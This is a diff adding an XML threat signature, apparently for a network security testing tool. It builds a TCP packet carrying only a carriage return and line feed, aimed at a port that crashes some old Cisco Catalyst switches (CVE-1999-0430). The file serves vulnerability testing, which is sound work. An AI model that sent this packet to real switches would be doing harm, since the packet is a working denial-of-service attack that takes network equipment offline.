@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco Catalyst CR Denial of Service"/>
+    <EngDesc display="true" value="This threat sends a Carriage Return as its payload.  This will cause a denial of service if sent to port 1761 on some Cisco Catalyst systems."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Switch"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cisco_Catalyst"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cisco_Catalyst_2.1(502)"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.cisco.com/cgi-bin/front.x/ipsalerts/getIDSInfo.pl?SIG_ID=3604&amp;SIG_SUB_ID=0"/>
+    <CVEID display="true" value="CVE-1999-0430"/>
+    <bugtraqID display="true" value="705"/>
+    <OSVDB display="true" value="1103"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059813c02e00c000a80001003c219b82be"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725870274062500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="F"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X0D\X0A"/>
+    <Created value="1139461915" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
